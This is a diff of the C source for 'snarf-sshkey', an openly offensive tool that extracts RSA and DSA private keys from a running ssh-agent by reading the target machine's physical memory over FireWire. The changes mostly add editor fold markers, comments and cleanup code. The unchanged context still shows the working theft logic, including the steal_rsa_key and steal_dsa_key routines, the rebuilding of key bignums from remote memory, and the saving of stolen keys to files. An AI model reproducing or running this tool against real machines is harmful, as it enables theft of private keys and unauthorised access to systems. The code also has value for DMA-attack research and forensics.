@@ -1,4 +1,6 @@
 /*  $Id$
+ * vim: fdm=marker
+ *
  *  snarf-sshkey : snarf ssh private keys from ssh-agent via
  *                 physical memory access (e.g. firewire)
  *
@@ -52,7 +54,7 @@ addr_t stack_bottom = 0;
 
 #define NODE_OFFSET     0xffc0
 
-// the following two functions, get_process_name and resolve_env are
+// the following two functions (get_process_name and resolve_env) are
 // using the stack bottom of the given process. i have found that
 // after a process starts and parses its ENV and ARGVs, all those are
 // in the uppermost page of the userspace (adr < 0xc0000000). in this
@@ -62,7 +64,7 @@ addr_t stack_bottom = 0;
 
 // return the process name in a malloc'ed buffer or NULL, if none.
 char* get_process_name(linear_handle h)
-{
+{{{
 	addr_t pn;
 	addr_t padr;
 	char* page;
@@ -103,7 +105,7 @@ char* get_process_name(linear_handle h)
 	free(page);
 
 	return ret;
-}
+}}}
 
 // will try to resolve an environment variable of the given process
 // by looking at the bottom of the stack
@@ -111,7 +113,7 @@ char* get_process_name(linear_handle h)
 //
 // uses stack_bottom from get_process_name()
 char* resolve_env(linear_handle h, char* envvar)
-{
+{{{
 	int i;
 	char* stack;			// buffer with all relevant pages (MAX_ARG_PAGES)
 	char* p;			// pointer to count downward in stack
@@ -179,7 +181,7 @@ char* resolve_env(linear_handle h, char* envvar)
 	}
 
 	return ret;
-}
+}}}
 
 
 // fix a remote bignum to a local bignum:
@@ -187,7 +189,7 @@ char* resolve_env(linear_handle h, char* envvar)
 //
 // returns malloc'ed bignum
 BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
-{
+{{{
 	addr_t p;
 	BIGNUM* b;
 #ifdef __BIG_ENDIAN__
@@ -240,14 +242,14 @@ BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
 
 	printf("recovered to 0x%08x\n", (uint32_t)b);
 	return b;
-}
+}}}
 
 // steal a RSA key:
 //   copy all important internal data of struct rsa_st
 //
 // copies RSA key to malloc'ed buffer
 int steal_rsa_key(linear_handle lin, Key* key)
-{
+{{{
 	addr_t p;
 
 	if(!key->rsa)
@@ -306,26 +308,51 @@ int steal_rsa_key(linear_handle lin, Key* key)
 	key->rsa->dmq1 = fix_bignum(lin, key->rsa->dmq1);
 	key->rsa->iqmp = fix_bignum(lin, key->rsa->iqmp);
 
-	if(key->rsa->n && key->rsa->e && key->rsa->d && key->rsa->p && key->rsa->q && key->rsa->dmp1 && key->rsa->dmq1 && key->rsa->iqmp) {
+	// x,y,z are public
+	// 	p is a random prime
+	// 	q is a random prime
+	// 	n = p*q   (public modulus; bit length of this is of interest)
+	//	e (public exponent): e*n is relatively prime (don't share other factors than 1)
+	//	  e is usually 3 or 65537 (Fermat's F4 number)
+	//	d = f(e,p,q)
+	//
+	//	dmp1
+	//	dmq1
+	//	iqmp
+	// n,e are public key; d is private key
+
+	// check if all bignums were recovered and do some sanitychecks
+	if(key->rsa->n && key->rsa->e && key->rsa->d && key->rsa->p && key->rsa->q && key->rsa->dmp1 && key->rsa->dmq1 && key->rsa->iqmp) {{{ // sanity checks
+
+
+
 		printf("\t\t\t" "\x1b[1;32m" "OK." "\x1b[0m" "\n");
 		return 1;
-	} else {
-		// TODO: free BIGNUMs
-		free(key->rsa);
-		key->rsa = NULL;
-		printf("\t\t\t" "\x1b[1;31m" "failed to recover bignums." "\x1b[0m" "\n");
-		return 0;
-	}
+	}}}
 
+	// failed to recover RSA bignums...
+
+	BN_free(key->rsa->n);
+	BN_free(key->rsa->e);
+	BN_free(key->rsa->d);
+	BN_free(key->rsa->p);
+	BN_free(key->rsa->q);
+	BN_free(key->rsa->dmp1);
+	BN_free(key->rsa->dmq1);
+	BN_free(key->rsa->iqmp);
+
+	free(key->rsa);
+	key->rsa = NULL;
+	printf("\t\t\t" "\x1b[1;31m" "failed to recover bignums." "\x1b[0m" "\n");
 	return 0;
-}
+}}}
 
 // steal a DSA key:
 //   copy all important internal data of struct dsa_st
 //
 // copies DSA key to malloc'ed buffer
 int steal_dsa_key(linear_handle lin, Key* key)
-{
+{{{
 	addr_t p;
 
 	if(!key->dsa)
@@ -386,9 +413,8 @@ int steal_dsa_key(linear_handle lin, Key* key)
 	//	priv_key = a number less than q
 	//	pub_key = g^priv_key mod p
 
-
-	if(key->dsa->p && key->dsa->q && key->dsa->g && key->dsa->pub_key && key->dsa->priv_key) {
-		// sanity check of parameters
+	// check if all bignums were recovered and do some sanitychecks
+	if(key->dsa->p && key->dsa->q && key->dsa->g && key->dsa->pub_key && key->dsa->priv_key) {{{ // sanity checks
 		int len;
 		int i;
 		int ret;
@@ -418,10 +444,7 @@ int steal_dsa_key(linear_handle lin, Key* key)
 				break;
 			}
 		}
-		/* is this neccessary?!
-		BN_CTX_free(ctx);
-		ctx = BN_CTX_new();
-		*/
+
 		if(ret == 1)
 			printf("\t\t\t(ok)   p seems to be a prime (after %d tests)\n", i);
 
@@ -441,6 +464,8 @@ int steal_dsa_key(linear_handle lin, Key* key)
 			printf("\t\t\t(WARN) pubkey does not match to parameters\n");
 
 		// this should suffice as a test
+		// show length of priv_key as info
+		printf("\t\t\t(info) priv_key is %d bits long\n", BN_num_bits(key->dsa->priv_key));
 
 		printf("\t\t\t" "\x1b[1;32m" "OK." "\x1b[0m" "\n");
 
@@ -448,11 +473,10 @@ int steal_dsa_key(linear_handle lin, Key* key)
 		BN_free(o);
 
 		return 1;
-	}
+	}}}
 
-	// BN_free can live with NULL.
-	// FIXME: if these failed: can bignums be invalid?! (->SIGSEGV ?!)
-	//  i don't think so.
+	// failed to recover DSA bignums...
+
 	BN_free(key->dsa->p);
 	BN_free(key->dsa->q);
 	BN_free(key->dsa->g);
@@ -463,12 +487,12 @@ int steal_dsa_key(linear_handle lin, Key* key)
 	key->dsa = NULL;
 	printf("\t\t\t" "\x1b[1;31m" "failed to recover bignums." "\x1b[0m" "\n");
 	return 0;
-}
+}}}
 
 // create a unique filename, consisting of target's 1394-GUID, ssh-agent's username and key's comment
-// save key to this file
+// and save the key to this file
 void save_key(linear_handle lin, char* key_comment, Key* key)
-{
+{{{
 	uint32_t high;
 	uint32_t low;
 	uint64_t guid;
@@ -519,7 +543,7 @@ void save_key(linear_handle lin, char* key_comment, Key* key)
 	free(filename);
 	free(comment);
 	free(username);
-}
+  }}}
 
 // attack an ssh-agent's address space:
 // 	create a string ala '$HOME/.ssh/'
@@ -530,7 +554,8 @@ void save_key(linear_handle lin, char* key_comment, Key* key)
 //		steal identity.key:
 //			steal identity.key.rsa and identity.key.dsa
 //			if one of them ok: save key to file
-void check_ssh_agent(linear_handle lin) {
+void check_ssh_agent(linear_handle lin)
+{{{
 #	define AGENT_START	0x08000
 #	define AGENT_MAXLEN	0x00800
 #	define REMOTE_TO_LOCAL(r,lbase)	((char*) (lbase + ((uint32_t)r) - (AGENT_START << 12)) )
@@ -658,14 +683,14 @@ void check_ssh_agent(linear_handle lin) {
 		// TODO: free key...
 	}
 	free(heap);
-}
+}}}
 
 // will scan the targets memory for pagedirs,
 // for each found: use pagedir for linear mapping. 
 //                 in linear address-space: resolve process name
 //                 if it is an ssh-agent, try to steal keys
 int main(int argc, char**argv)
-{
+{{{
 	physical_handle phy;
 	union physical_type_data phy_data;
 	linear_handle lin;
@@ -764,5 +789,5 @@ int main(int argc, char**argv)
 	// exit 
 	raw1394_destroy_handle(phy_data.ieee1394.raw1394handle);
 	return 0;
-}
+}}}
 
